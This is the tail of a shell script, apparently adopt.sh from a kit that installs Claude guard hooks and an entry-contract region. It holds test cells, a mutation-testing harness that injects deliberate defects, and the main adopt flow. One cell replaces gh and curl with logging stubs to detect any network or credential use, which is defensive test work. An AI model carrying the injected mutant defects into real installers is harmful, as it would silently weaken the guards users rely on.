    a7_wired "$1"; { region_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md"; printf '%s\n\nExample text.\n' "$_eh"; } > "$TGT/CLAUDE.md"; commit_all "$TGT" wired
    arun "$1" "$TGT" --out "$P"; refused "A7 an identical region closed by '$_eh'" "refuses your CLAUDE.md or AGENTS.md as they stand"
    has "fix what it names, then rerun" "A7 an identical region closed by '$_eh' says what to do next"
    hasnt "entry contract current" "A7 an identical region closed by '$_eh' is not called current"
  done
  # a closing heading in another script is visible text: current (the bytes are octal escapes for UTF-8, so the file holds no literal non-ASCII)
  a7_wired "$1"; { region_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md"; printf '## \316\244\316\255\316\273\316\277\317\202\n\nExample text.\n'; } > "$TGT/CLAUDE.md"; commit_all "$TGT" wired
  arun "$1" "$TGT" --out "$P"
  rc_is 0 "A7 an identical region closed by a Greek heading: the verb exits 0"
  has "entry contract current" "A7 an identical region closed by a Greek heading is called current"
  # an identical region that is the only section: the closing heading is added
  a7_wired "$1"; region_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md" > "$TGT/CLAUDE.md"; commit_all "$TGT" wired
  arun "$1" "$TGT" --out "$P"
  if a7_apply "an identical only section"; then
    a7_sec "an identical only section" CLAUDE.md
    file_has "$TGT/CLAUDE.md" "$(closing_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md")" "A7 an identical only section: the kit's closing heading is added"
    has "  CLAUDE.md: the kit's closing heading is added" "A7 an identical only section: a plain line for CLAUDE.md"
  fi
}
a7_tmpdir() {  # <kit>: a TMPDIR inside the target is refused before the work directory is created, on any mktemp (BSD ignores TMPDIR when no template is given)
  mk_repo; mkdir -p "$TGT/tmpd"; snap "$TGT" > "$W/snap.before"
  ARUN_TMP="$TGT/tmpd"; arun "$1" "$TGT" --out "$P"; ARUN_TMP=""
  refused "A7 a TMPDIR inside the target" "TMPDIR points inside the target repository"
  has "set TMPDIR outside it, then rerun" "A7 a TMPDIR inside the target says what to do next"
  snap "$TGT" > "$W/snap.after"
  if cmp -s "$W/snap.before" "$W/snap.after"; then chk 0 "A7 a TMPDIR inside the target leaves the target unchanged"; else chk 1 "A7 a TMPDIR inside the target leaves the target unchanged"; fi
}
a7_refusals() {  # <kit>
  a7_case "$1" "Example line\r\nsecond line\r\n"; refused "A7 a CR byte" "line endings"
  has "convert it to LF" "A7 a CR byte says what to do next"
  a7_case "$1" "# Example Title\n\n## Example Other\n\ntext\n\n## 1. Entry contract - EXAMPLE old\n\nbody\n"; refused "A7 a misplaced region" "not its first '## ' section"
  has "move it to the top, or delete it" "A7 a misplaced region says what to do next"
  a7_case "$1" "Example prose above.\n\n## 1. Entry contract - EXAMPLE old\n\nbody\n"; refused "A7 prose above an old region" "prose above its old entry contract"
  has "placement rule 1" "A7 prose above an old region names the rule"
  has "move the prose below the region, or delete the old region, then rerun" "A7 prose above an old region says what to do next"
  mk_repo; ln -s "$W/ext$SEQ.md" "$TGT/AGENTS.md"; arun "$1" "$TGT" --out "$P"; refused "A7 a symlinked AGENTS.md" "symbolic link"
  mk_repo; printf 'Example\n' > "$TGT/CLAUDE.md"; commit_all "$TGT" cfg; printf 'Example edited\n' > "$TGT/CLAUDE.md"
  arun "$1" "$TGT" --out "$P"; refused "A7 a dirty tracked CLAUDE.md" "uncommitted change"
  a7_tpl "$1" "a template with no region" 's/^## /### /' "no entry-contract section"
  a7_tpl "$1" "a template with no closing heading" '/^## 1\. Entry/!s/^## /### /' "no entry-contract section"
}
cell_a7() {  # the entry-contract region in CLAUDE.md and AGENTS.md (errata E1)
  region_of "$1/templates/PROJECT-CLAUDE-TEMPLATE.md" > "$W/a7.reg"
  a7_insert "$1"
  a7_replace "$1"
  a7_refusals "$1"
  a7_adopted "$1"
  a7_tmpdir "$1"
  # an old region followed by a heading that renders empty passes the verb's own checks (it does not grade the terminator on a replace) and fails only the lock leg
  a7_case "$1" "# Example Title\n\n## 1. Entry contract - EXAMPLE old\n\nExample old body line.\n\n## <!-- -->\n\nExample text.\n"
  rc_is 1 "A7 an old region followed by an empty-rendering heading: exits 1"
  has "entry-contract check refused" "A7 an old region followed by an empty-rendering heading: refused by the lock leg"
  absent "$P" "A7 an old region followed by an empty-rendering heading: no file at --out"
  a7_fault "$1"
}

cell_a8() {  # no forge, no credential, no network, no value printed
  mk_repo; mkdir -p "$TGT/.claude"; printf '%s\n' '{"env":{"EXAMPLE_NAME":"EXAMPLE_VALUE"}}' > "$TGT/.claude/settings.json"; commit_all "$TGT" cfg
  : > "$W/stub.log"
  arun "$1" "$TGT" --out "$P"
  rc_is 0 "A8 the verb exits 0"
  has "This patch contains your settings.json and its values, including its env values. Read it yourself; an agent should not read it." "A8 the settings-and-env warning is printed"
  hasnt "EXAMPLE_VALUE" "A8 no settings value reaches the terminal"
  hasnt "EXAMPLE_TOKEN_PLACEHOLDER" "A8 the placeholder token is never printed"
  if [ ! -s "$W/stub.log" ]; then chk 0 "A8 neither gh nor curl was called"; else chk 1 "A8 neither gh nor curl was called"; fi
}

apply_sed() {  # <label> <kit dir> <sed script>: the script is applied to the kit's adopt.sh; rc 1 (and a red) when it matched nothing or the result does not parse
  printf '%s\n' "$3" > "$W/mut.sed"
  sed -f "$W/mut.sed" "$2/scripts/adopt.sh" > "$2/scripts/adopt.sh.mut"
  if cmp -s "$2/scripts/adopt.sh" "$2/scripts/adopt.sh.mut"; then chk 1 "$1 applied (the sed script matched nothing)"; rm -f "$2/scripts/adopt.sh.mut"; return 1; fi
  cat "$2/scripts/adopt.sh.mut" > "$2/scripts/adopt.sh"; rm -f "$2/scripts/adopt.sh.mut"
  if ! sh -n "$2/scripts/adopt.sh" 2>/dev/null; then chk 1 "$1 parses (a mutant that cannot run would read as killed)"; return 1; fi
  return 0
}
mutant() {  # <label> <sed script> <cell>...: every named cell must go red on the mutated verb
  _ml=$1; _msd=$2; shift 2
  mk_kit; _mk=$KITDIR
  apply_sed "mutant $_ml" "$_mk" "$_msd" || { rm -rf "$_mk"; return 0; }
  for _mc in "$@"; do
    _sv=$SELFTEST_BAD; SELFTEST_BAD=0; SELFTEST_QUIET=1
    "$_mc" "$_mk"
    rm -rf "$W"/t[0-9]* "$W"/o[0-9]* "$W"/f[0-9]* "$W"/ext* "$W"/plain*
    _red=$SELFTEST_BAD; SELFTEST_BAD=$_sv; SELFTEST_QUIET=0
    if [ "$_red" -gt 0 ]; then chk 0 "mutant $_ml reds ${_mc#cell_}"; else chk 1 "mutant $_ml survived ${_mc#cell_} (the cell did not red)"; fi
  done
  rm -rf "$_mk"
}

selftest() {
  { [ -f "$ROOT/conformance/guard-wired.sh" ] && [ -f "$ROOT/docs/adoption/brownfield.md" ] && [ -f "$ROOT/conformance/agents-brief.sh" ] && [ -f "$TPL" ]; } || { echo "FAIL: $ROOT lacks conformance/guard-wired.sh, conformance/agents-brief.sh, templates/PROJECT-CLAUDE-TEMPLATE.md or docs/adoption/brownfield.md; adopt --selftest cannot build its fixture kit"; return 1; }
  jq_ok 2>/dev/null || { echo "FAIL: adopt --selftest needs jq 1.7 or later"; return 1; }
  unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE
  W=$(mktemp -d) || { echo "FAIL: no temp dir"; return 1; }
  trap 'rm -rf "$W"' EXIT
  trap 'rm -rf "$W"; exit 129' HUP
  trap 'rm -rf "$W"; exit 130' INT
  trap 'rm -rf "$W"; exit 143' TERM
  mkdir -p "$W/home" "$W/stubs"
  for _s in gh curl; do printf '#!/bin/sh\necho called >> "%s/stub.log"\nexit 1\n' "$W" > "$W/stubs/$_s"; chmod +x "$W/stubs/$_s"; done
  KMATCH='Bash|Write|Edit|NotebookEdit|mcp__.*|Read'
  KIT0="$W/kit0"; mkdir -p "$KIT0/scripts" "$KIT0/conformance" "$KIT0/docs/adoption" "$KIT0/.claude/hooks" "$KIT0/templates" "$KIT0/adapters/example-a" "$KIT0/adapters/example-b"
  cp "$ROOT/scripts/adopt.sh" "$KIT0/scripts/adopt.sh"
  cp "$ROOT/conformance/guard-wired.sh" "$KIT0/conformance/guard-wired.sh"
  cp "$ROOT/conformance/agents-brief.sh" "$KIT0/conformance/agents-brief.sh"
  cp "$TPL" "$KIT0/templates/PROJECT-CLAUDE-TEMPLATE.md"
  printf '{"contextFile": "CLAUDE.md"}\n' > "$KIT0/adapters/example-a/adapter.json"   # synthetic manifests: the two context files the verb stamps
  printf '{"contextFile": "AGENTS.md"}\n' > "$KIT0/adapters/example-b/adapter.json"
  cp "$ROOT/docs/adoption/brownfield.md" "$KIT0/docs/adoption/brownfield.md"
  printf '#!/bin/sh\n# EXAMPLE_VALUE kit guard\nexit 0\n' > "$KIT0/.claude/hooks/guard.sh"
  printf '#!/bin/sh\n# EXAMPLE_VALUE kit guard core\nexit 0\n' > "$KIT0/.claude/hooks/guard-core.sh"
  CANON=$(extract_canon "$KIT0/conformance/guard-wired.sh") || { echo "FAIL: GW_CANON could not be read from conformance/guard-wired.sh"; return 1; }
  mk_kit_settings "$KIT0/.claude/settings.json"
  for _c in cell_a1 cell_a2 cell_a3 cell_a4 cell_a5 cell_a6 cell_a7 cell_a8; do
    mk_kit; "$_c" "$KITDIR"
    rm -rf "$KITDIR" "$W"/t[0-9]* "$W"/o[0-9]* "$W"/f[0-9]* "$W"/ext* "$W"/plain*
  done
  mutant "write-claude-directly" '/# MUT-WRITEDIRECT$/s/.*/  mkdir -p "$TROOT\/.claude"; cp -Rp "$T\/chk\/.claude\/." "$TROOT\/.claude\/"/' cell_a1
  mutant "drop-an-adopter-key" '/# MUT-DROPKEY$/s/\.permissions\.deny = /del(.model) | .permissions.deny = /' cell_a2
  mutant "re-match-the-shared-element" '/# MUT-REMATCH$/s/elif \$el.matcher == \$m then .out += [[]\$el |/elif true then .out += [$el | .matcher = $m |/' cell_a2
  mutant "no-idempotence" '/# MUT-NOIDEM$/s/.*/sem_equal() { return 1; }   # MUT-NOIDEM/' cell_a3
  mutant "skip-the-strict-gate" '/# MUT-NOGATE$/s/.*/  :/' cell_a4g
  mutant "substring-guard-match" '/# MUT-SUBSTR$/s/^GUARD_RE=.*# MUT-SUBSTR$/GUARD_RE=guard.sh   # MUT-SUBSTR/' cell_a4s
  mutant "unanchored-guard-match" '/# MUT-SUBSTR$/s/\\A[[][[]:space:]]\*(/[[:space:]]*(/
/# MUT-SUBSTR$/s/[[][[]:space:]]\*\\z/[[:space:]]*/' cell_a4s
  mutant "skip-the-self-check" '/# MUT-NOCHECK$/s/.*/  :/' cell_a5
  mutant "ignore-a-warn" '/# MUT-IGNWARN$/s/\^WARN:/^NO-SUCH-LINE:/' cell_a5
  mutant "skip-the-deny-assertion" '/# MUT-NODENY$/s/.*/  :/' cell_a5
  mutant "drop-the-region-byte-check" '/# MUT-REGBYTES$/s/.*/  :/' cell_a7
  mutant "insert-below-instead-of-above" '/# MUT-INSBELOW$/s|.*|  _ins=$(( $(grep -c "" "$1") + 1 ))   # MUT-INSBELOW|' cell_a7
  mutant "grade-all-of-agents-brief-as-passing" '/# MUT-ECFAIL$/s/(FAIL|UNVERIFIED)/NO-SUCH/' cell_a7
  mutant "skip-the-as-is-lock" '/# MUT-ASISLOCK$/s/.*/  :/' cell_a7
  if [ "$SELFTEST_BAD" -eq 0 ]; then echo "adopt --selftest: OK"; return 0; fi
  echo "adopt --selftest: FAIL ($SELFTEST_BAD)" >&2; return 1
}

# --- main ---
if [ "${1:-}" = "--selftest" ]; then selftest; exit $?; fi

TARGET=""; OUT=""; REPLACE=0
while [ $# -gt 0 ]; do
  case "$1" in
    --out) [ $# -ge 2 ] || die2 "--out requires a value"; OUT=$2; shift 2 ;;
    --replace-guard) REPLACE=1; shift ;;
    -h|--help) usage ;;
    -*) die2 "unknown flag '$(safe "$1")'" ;;
    *) [ -z "$TARGET" ] || die2 "one <target-repo> only"; TARGET=$1; shift ;;
  esac
done
{ [ -n "$TARGET" ] && [ -n "$OUT" ]; } || usage

need_tools
read_wiring
check_target
check_paths
check_out
tmp_parent
T=$(mktemp -d "$TPARENT/adopt.XXXXXX") || die2 "no temp dir"
trap 'rm -rf "$T"' EXIT
trap 'rm -rf "$T"; exit 129' HUP
trap 'rm -rf "$T"; exit 130' INT
trap 'rm -rf "$T"; exit 143' TERM
check_tmp
snapshot_base
SJ="$T/base/.claude/settings.json"; GI="$T/base/.gitignore"
check_settings
plan_guards
plan_settings
GI_MISSING=$(gi_missing)
load_region
plan_entry
if [ "$SET_STATE" = none ] && [ -z "$GUARD_WRITE" ] && [ -z "$GI_MISSING" ] && [ -z "$EC_WRITE" ]; then
  as_is_lock   # MUT-ASISLOCK
  already; exit 0
fi
compose
if [ ! -s "$T/patch" ]; then
  as_is_lock   # MUT-ASISLOCK
  already; exit 0
fi
verify_applied   # MUT-NOCHECK
write_out
report
